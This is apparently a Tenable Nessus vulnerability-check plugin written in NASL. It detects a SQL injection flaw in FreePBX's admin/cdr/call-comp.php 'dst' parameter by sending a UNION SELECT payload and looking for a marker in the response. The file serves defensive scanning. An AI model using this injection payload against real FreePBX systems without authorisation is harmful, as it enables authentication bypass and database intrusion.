#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(49998);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/10/10 15:57:05 $");

  script_bugtraq_id(43375);
  script_osvdb_id(68181);
  script_xref(name:"Secunia", value:"41558");

  script_name(english:"FreePBX admin/cdr/call-comp.php 'dst' Parameter SQLi");
  script_summary(english:"Attempts to inject SQL code via the admin/cdr/call-comp.php script.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of FreePBX installed on the remote host is affected by a
SQL injection vulnerability involving the 'dst' parameter as used in
the 'admin/cdr/call-comp.php' script.

An unauthenticated, remote attacker can leverage this issue to launch
a SQL injection attack against the affected application, leading to
authentication bypass, discovery of sensitive information, attacks
against the underlying database, and the like.

Note that it may also be possible to exploit this vulnerability via
other parameters, though Nessus has not tested these.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Sep/343");
  script_set_attribute(attribute:"see_also", value:"http://code.freepbx.org/changelog/FreePBX_SVN?cs=10274");
  script_set_attribute(attribute:"solution", value:
"Apply the patch referenced in changeset 10274. Note that this patch
forces the affected scripts to require authentication but does not
close the vulnerability.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/09/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:freepbx:freepbx");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("freepbx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "installed_sw/FreePBX");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = 'FreePBX';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

# Make sure the affected script exists
res = http_send_recv3(method:"GET", item:dir + '/admin/cdr/call-comp.php', port:port, exit_on_fail:TRUE);

if ('401 Unauthorized' >< res[0]) exit(0, "The "+app+" install at "+install_url+" restricts access to its admin pages.");

if (
  !res[2] ||
  (
    '<!-- ** ** ** ** ** Part for the research ** ** ** ** ** -->' >!< res[2] &&
    '<center><h3>No calls in your selection.</h3></center>' >!< res[2]
  )
) exit(0, "The "+app+" install at "+install_url+" does not appear to have the 'admin/cdr/call-comp.php' script.");


# Attempt the exploit
payload = SCRIPT_NAME + '-' + unixtime();
exploit = payload + "%' UNION SELECT 'NESSUS',2,3,4,5,6,7,8,9 -- '";
postdata = 'posted=1&fromstatsday_sday=NESSUS&fromstatsmonth_sday=NESSUS&days_compare=NESSUS&dst='+urlencode(str:exploit);

res2 =  http_send_recv3(
  method  : "POST",
  port    : port,
  item    : dir+'/admin/cdr/call-comp.php',
  data    : postdata,
  add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);

if (
  '<!-- ** ** ** ** ** Part to display the GRAPHIC ** ** ** ** ** -->' >< res2[2] &&
  '<!-- Fin Tableau Global //-->' >< res2[2] &&
  '<IMG SRC="common/graph_stat.php?min_call=&fromstatsday_sday=31&days_compare=NESSUS&fromstatsmonth_sday=NESSUS&dsttype=&srctype=&clidtype=&channel=&resulttype=&dst='+exploit+'&src=&clid=&userfieldtype=&userfield=&accountcodetype=&accountcode=" ALT="Stat Graph">' >< res2[2]
)
{
  output = strstr(res2[2],'<IMG SRC="common/graph_stat');
  if (empty_or_null(output)) output = res2[2];

  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(http_last_sent_request()),
    output     : chomp(output)
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
